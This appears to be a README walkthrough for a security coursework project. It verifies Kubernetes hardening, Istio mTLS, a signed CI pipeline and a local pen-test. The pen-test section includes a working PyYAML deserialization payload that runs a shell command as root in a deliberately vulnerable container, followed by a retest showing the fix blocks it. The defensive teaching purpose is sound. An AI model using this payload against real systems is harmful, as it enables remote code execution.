# Run & Test — Beginner's Guide

A copy-paste walkthrough. Each block says **what to run** and **what you should see**.
Open the **Terminal** app, then paste one block at a time and press Enter.

> **Where am I?** First move into the project folder (every command below assumes this):
> ```bash
> cd ~/Documents/GitHub/DODO-TASK
> ```

---

## 0. Is everything running? (30-second health check)

```bash
docker info >/dev/null 2>&1 && echo "Docker: UP" || echo "Docker: DOWN -> run 'colima start'"
kubectl get nodes
kubectl -n payments get pods
```
**You should see:** `Docker: UP`, three nodes `Ready`, and pods `2/2 Running`.
`2/2` means two containers per pod: your app **+** its Istio security sidecar.

> **If Docker is DOWN** (the VM sometimes stops): run `colima start` and wait ~30s.
> **If the cluster is gone entirely:** jump to section 6 (Rebuild from scratch).

---

## 1. Task 1 — Hardening (is the app locked down?)

**a) Prove the app runs as a normal user, not root, and can't write files:**
```bash
POD=$(kubectl -n payments get pod -l app=ledger-api -o jsonpath='{.items[0].metadata.name}')
kubectl -n payments exec $POD -c ledger-api -- id
kubectl -n payments exec $POD -c ledger-api -- touch /test 2>&1
```
**You should see:** `uid=10001(app)` (NOT root), and `Read-only file system` (can't tamper).

**b) Prove the app's identity can't read secrets (least privilege):**
```bash
kubectl auth can-i get secrets --as=system:serviceaccount:payments:ledger-api -n payments
```
**You should see:** `no`.

**c) Prove the guardrail BLOCKS the old insecure deployment:**
```bash
kubectl apply -f _original/deployment.yaml
```
**You should see:** a red error — `denied the request` / `blocked due to the following policies`.
That's Kyverno + Pod Security **refusing** a root container. Good — it's working.

**d) See the secret is encrypted in git (no plaintext):**
```bash
cat task1-harden/secrets/ledger-api-secrets.enc.yaml | grep STRIPE_API_KEY
```
**You should see:** `ENC[AES256_GCM,...]` — encrypted, not the real value.

---

## 2. Task 3 — Zero-trust mesh (who can talk to the app?)

**a) The ALLOWED service (reporting) can reach the app:**
```bash
kubectl -n payments exec deploy/reporting -c client -- \
  curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://ledger-api:8080/health
```
**You should see:** `HTTP 200` (allowed).

**b) A DIFFERENT (unauthorized) identity is blocked:**
```bash
kubectl -n payments run intruder --image=curlimages/curl:8.8.0 --restart=Never \
  --overrides='{"spec":{"securityContext":{"runAsNonRoot":true,"runAsUser":100,"seccompProfile":{"type":"RuntimeDefault"}},"containers":[{"name":"c","image":"curlimages/curl:8.8.0","command":["sleep","30"],"securityContext":{"allowPrivilegeEscalation":false,"readOnlyRootFilesystem":true,"runAsNonRoot":true,"runAsUser":100,"capabilities":{"drop":["ALL"]}}}]}}'
sleep 8
kubectl -n payments exec intruder -c c -- \
  curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://ledger-api:8080/health
kubectl -n payments delete pod intruder
```
**You should see:** `HTTP 403` (blocked — only the `reporting` identity is allowed).

**c) See the mTLS setting and the app's cryptographic identity:**
```bash
kubectl -n payments get peerauthentication
```
**You should see:** `MODE: STRICT` (all traffic must be encrypted + authenticated).

---

## 3. Task 4 — The pen-test (attack the vulnerable app)

This runs the **deliberately-vulnerable** version in a throwaway container (safe, offline).

**Start the vulnerable target:**
```bash
docker rm -f ledger-target 2>/dev/null
docker build -q -t ledger-api:starter task4-recon-pentest/pentest/target
docker run -d --name ledger-target -p 8080:8080 \
  -e STRIPE_API_KEY="sk_live_9f3a2b7c1e4d8REDACTED" -e DB_PASSWORD="P@ssw0rd123" ledger-api:starter
sleep 3
```

**Attack 1 — steal the credit card numbers (should NOT be exposed):**
```bash
curl -s http://localhost:8080/transactions
```
**You should see:** full card numbers (`4242...`) — that's the vulnerability.

**Attack 2 — remote code execution as root (the critical bug):**
```bash
printf '!!python/object/new:type\n  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]\n  listitems: "__import__(\x27os\x27).system(\x27id > /tmp/pwned.txt\x27)"' > /tmp/rce.yaml
curl -s -X POST http://localhost:8080/import --data-binary @/tmp/rce.yaml -H 'Content-Type: text/plain' >/dev/null
docker exec ledger-target cat /tmp/pwned.txt
```
**You should see:** `uid=0(root)` — the attacker ran a command **as root**. Very bad.

**Now the retest — the FIXED version blocks the same attacks:**
```bash
docker rm -f ledger-hardened 2>/dev/null
docker run -d --name ledger-hardened -p 8090:8080 --read-only --tmpfs /tmp \
  --cap-drop ALL --user 10001:10001 -e TOKEN_SALT=demo -e FETCH_ALLOWED_HOSTS=api.example \
  ghcr.io/abdulnafih2002/ledger-api:0.1.0 2>/dev/null || \
  { docker build -q -t ghcr.io/abdulnafih2002/ledger-api:0.1.0 task1-harden/app && \
    docker run -d --name ledger-hardened -p 8090:8080 --read-only --tmpfs /tmp \
    --cap-drop ALL --user 10001:10001 -e TOKEN_SALT=demo -e FETCH_ALLOWED_HOSTS=api.example \
    ghcr.io/abdulnafih2002/ledger-api:0.1.0; }
sleep 4
echo "--- cards now masked: ---"; curl -s http://localhost:8090/transactions
echo "--- RCE now rejected: ---"; curl -s -X POST http://localhost:8090/import --data-binary @/tmp/rce.yaml -H 'Content-Type: text/plain'
```
**You should see:** masked cards (`424242******4242`) and `{"error":"invalid yaml"}` — attacks closed.

**Clean up the test containers:**
```bash
docker rm -f ledger-target ledger-hardened 2>/dev/null
```

The full written report with severity scores is in **[task4-recon-pentest/REPORT.md](task4-recon-pentest/REPORT.md)**.

---

## 4. Task 2 — The CI/CD pipeline (runs on GitHub, not your laptop)

Nothing to run locally — it runs automatically on GitHub when code is pushed.
Open in your browser:
**https://github.com/Abdulnafih2002/DODO-TASK/actions**

**You should see:** a green ✓ run named "ledger-api-secure-supply-chain" with 4 jobs passing
(secrets scan, SAST, CVE scan, then build + sign). Click it to see each security gate.

Prove the published image is signed (optional, needs the `cosign` tool):
```bash
cosign verify ghcr.io/abdulnafih2002/ledger-api:0.1.0 \
  --certificate-identity-regexp "https://github.com/Abdulnafih2002/DODO-TASK/.github/workflows/.*" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com"
```
**You should see:** `Verification for ... --` and `cosign claims were validated`.

---

## 5. Read the evidence (already captured)

```bash
cat task1-harden/screenshots/task1-verification.txt      # hardening proof
cat task1-harden/screenshots/task1-kyverno-reject.txt    # guardrail blocking bad deploy
cat task3-mesh/screenshots/task3-zerotrust.txt           # mTLS + allowed/blocked
cat task4-recon-pentest/pentest/evidence/retest_hardened.txt  # attacks closed
```

---

## 6. Rebuild everything from scratch (only if the cluster is gone)

Takes ~10-15 min. Run these in order:
```bash
cd ~/Documents/GitHub/DODO-TASK
colima start --cpu 4 --memory 8 2>/dev/null          # start Docker VM if stopped

# 1) cluster + the app image
kind create cluster --config kind-config.yaml
docker build -t ghcr.io/abdulnafih2002/ledger-api:0.1.0 task1-harden/app
kind load docker-image ghcr.io/abdulnafih2002/ledger-api:0.1.0 --name dodo

# 2) admission guardrail (Kyverno)
helm repo add kyverno https://kyverno.github.io/kyverno && helm repo update
helm install kyverno kyverno/kyverno -n kyverno --create-namespace --wait

# 3) Task 1 — namespace, policies, secret, workload
kubectl apply -f task1-harden/manifests/00-namespace.yaml -f task1-harden/policies/kyverno-policies.yaml
SOPS_AGE_KEY_FILE=~/.config/sops/age/keys.txt sops -d task1-harden/secrets/ledger-api-secrets.enc.yaml | kubectl apply -f -
kubectl apply -f task1-harden/manifests/ -f task1-harden/rbac/personas.yaml

# 4) Task 3 — Istio mesh (CNI so it works with restricted security)
istioctl install --set profile=minimal --set components.cni.enabled=true \
  --set values.cni.cniBinDir=/opt/cni/bin --set values.cni.cniConfDir=/etc/cni/net.d -y
kubectl -n payments rollout restart deploy/ledger-api deploy/reporting
kubectl -n payments rollout status deploy/ledger-api
kubectl apply -f task3-mesh/istio/10-peerauthentication-strict.yaml \
              -f task3-mesh/istio/20-authorizationpolicy.yaml \
              -f task3-mesh/networkpolicy/networkpolicies.yaml
```
Then re-run sections 1–3 to test.

**To delete everything and free your laptop:**
```bash
kind delete cluster --name dodo      # removes the whole cluster
colima stop                          # stops the Docker VM
```

---

### Tips for beginners
- **Copy-paste one block at a time.** If a command seems stuck, it's usually waiting — give it a minute.
- **`kubectl`** = talk to the cluster. **`docker`** = run single containers. **`-n payments`** = "in the payments namespace" (a folder for our app).
- Nothing here touches the internet or real systems except the GitHub pipeline (section 4). The pen-test is 100% local.
